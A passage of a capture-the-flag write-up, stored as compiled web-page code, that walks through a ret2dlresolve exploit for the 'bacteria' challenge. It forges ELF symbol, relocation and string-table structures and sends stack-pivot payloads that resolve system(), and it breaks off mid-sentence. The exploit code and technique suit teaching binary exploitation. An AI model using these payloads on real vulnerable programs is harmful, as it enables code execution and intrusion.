*/\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Half st_shndx\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"      \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Associated section index (2 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Addr st_value\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"      \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Value of the symbol (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Xword st_size\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"      \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Associated symbol size (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),\" Elf64_Sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The variable we want to fake here is st_name and we just keep the others same as Elf64_Sym of read:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/read_fake_keep.png\",alt:\"read_fake_keep.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"But because our space is limited so we cannot write the struct in 0x10 bytes, the other 0x10 bytes will be use to control the flow. So our Elf64_Sym_Struct would be like this:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p32\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xdeadbeef\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Unknown, temporary\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x12\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p16\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_value \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# st_size is null already because the stack now contain all null byte\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# so we don\\u2019t need to write these variable, just need to pad full 0x10\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# bytes so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` st_shndx\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Because we haven\\u2019t build up structure for STRTAB so st_name will be \",(0,e.jsx)(n.code,{children:\"0xdeadbeef\"}),\", just temporary and will change when STRTAB is finished. Now we will leave it here and continue with the second struct: Elf64_Rela!\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-3-fake-address-and-structure-of-elf64_rela\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-3-fake-address-and-structure-of-elf64_rela\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 3: Fake address and structure of Elf64_Rela\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, we will need the address for Elf64_Rela struct to make \",(0,e.jsx)(n.code,{children:\"reloc_arg\"}),\" is an integer with the following calculation:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`    \u003cAddress of Elf64_Rela\u003e = \u003cJMPREL\u003e + \u003creloc_arg\u003e * 24\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\u003c=\u003e \u003creloc_arg\u003e = ( \u003cAddress of Elf64_Rela\u003e - \u003cJMPREL\u003e ) / 24\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"After a while trying various address, the address of Elf64_Rela will be \",(0,e.jsx)(n.code,{children:\"rw_section + 0x40\"}),\" and we have the following stuffs:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`JMPREL = 0x400300\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Elf64_Rela_addr  = rw_section + 0x40                      = 0x403e40\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`reloc_arg        = int(( Elf64_Rela_addr - JMPREL) / 24)  = 632\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Now we will create the structure for Elf64_Rela which is defined as follows:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-c\",children:(0,e.jsxs)(n.code,{className:\"language-c code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"typedef\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"elf64_rela\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Addr r_offset\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"      \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Location at which to apply the action (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Xword r_info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"       \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* index and type of relocation (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Sxword r_addend\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Constant addend used to compute value (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),\" Elf64_Rela\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We will fake r_offset and r_info while r_addend is the same with .rela.plt of read, which is null byte:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/read_JMPREL_GDB.png\",alt:\"read_JMPREL_GDB.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"So our struct for Elf64_Rela will be as following:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xdeadbeef\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Unknown, temporary\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"symbol_number \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\u003c\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x7\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# r_addend is null and stack is null already so we don\\u2019t need to write this,\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# also because we run out of 0x10 bytes we can write\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` r_info\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We know that r_offset is the place which contains the resolved libc address so we will chose the address for that later. Now we will move to the last thing we need to fake: STRTAB.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-4-fake-address-and-structure-of-strtab\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-4-fake-address-and-structure-of-strtab\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 4. Fake address and structure of STRTAB\"]}),`\n`,(0,e.jsx)(n.p,{children:\"As 2 part above does at the begining, we will choose the address for STRTAB first. This address also have to satisfy this calculation:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`    \u003cAddress for STRTAB\u003e = \u003cSTRTAB\u003e + \u003cst_name\u003e\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\u003c=\u003e \u003cst_name\u003e = \u003cAddress for STRTAB\u003e - \u003cSTRTAB\u003e\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So this is easier because we don\\u2019t have a division in the calculation. So we will choose any address which doesn\\u2019t overwrite the other data:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`STRTAB_addr  = rw_section + 0x80     = 0x403e80\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`st_name      = STRTAB_addr - STRTAB  = 15296\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And the struct for STRTAB is just simply a string contain the function we want:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'system\\\\x00\\\\x00'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"              \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so we don\\u2019t need to sleep() when read\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"From here, we have 2 things we haven\\u2019t done is st_name of Elf64_Sym and r_offset of Elf64_Rela. For st_name, we can get that from STRTAB above so stage 2 will change like this:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"SYMTAB \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400290\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),` rw_section\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"symbol_number  \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"int\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Sym_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" SYMTAB\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p32\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"15296\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change here\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x12\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p16\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_value \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# st_size is null already because the stack now contain all null byte\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# so we don\\u2019t need to write these variable, just need to pad full 0x10\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# bytes so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` st_value\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And for r_offset, we just leave it as \",(0,e.jsx)(n.code,{children:\"0xdeadbeef\"}),\" and will change that after checking the stack. So now we just move to the next stage to know if our struct are in the correct position or not.\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-5-conduct-ret2dlresolve--leak-libc-address\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-5-conduct-ret2dlresolve--leak-libc-address\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 5. Conduct ret2dlresolve \u0026 Leak libc address\"]}),`\n`,(0,e.jsx)(n.p,{children:\"We have the address for each struct so now just write stuff to stack. Remember where we stopped was at the stage 1 with the following code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x403e00\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"mov_rsi_rbp_read \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401027\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"           \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"                   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So we will need to change the place we stack pivot because we want to write Elf64_Sym at the same time we stack pivot so our first stage will change a bit at the fake rbp:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x403e00\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"mov_rsi_rbp_read \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401027\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"                   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Because we want the Elf64_Sym structure is placed at the correct address so we subtract with 0x10 so that in the next input, we will write the first 0x10 of fake rbp and rip, then the next 0x10 is the Elf64_Sym in the correct address. And when it read for the second time, which means it\\u2019s reading to the address of rw_section - 0x10. So we will write the ELf64_Sym struct to here with following code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write Elf64_Sym structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to Elf64_Rela address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` Elf64_Sym_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And with the next input, it will read to the address of \",(0,e.jsx)(n.code,{children:\"Elf64_Rela_addr - 0x10\"}),\" so we will write the Elf64_Rela structure with the following code:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write Elf64_Rela structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to STRTAB address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` Elf64_Rela_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And with the next read(), it will write to the STRTAB address so we have the following code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write STRTAB structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Check first, change later\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` STRTAB_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We will get the reloc_arg to check if all the structures are set properly or not:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsx)(n.code,{className:\"language-python code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"reloc_arg\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,e.jsx)(n.p,{children:\"and run with GDB attached for 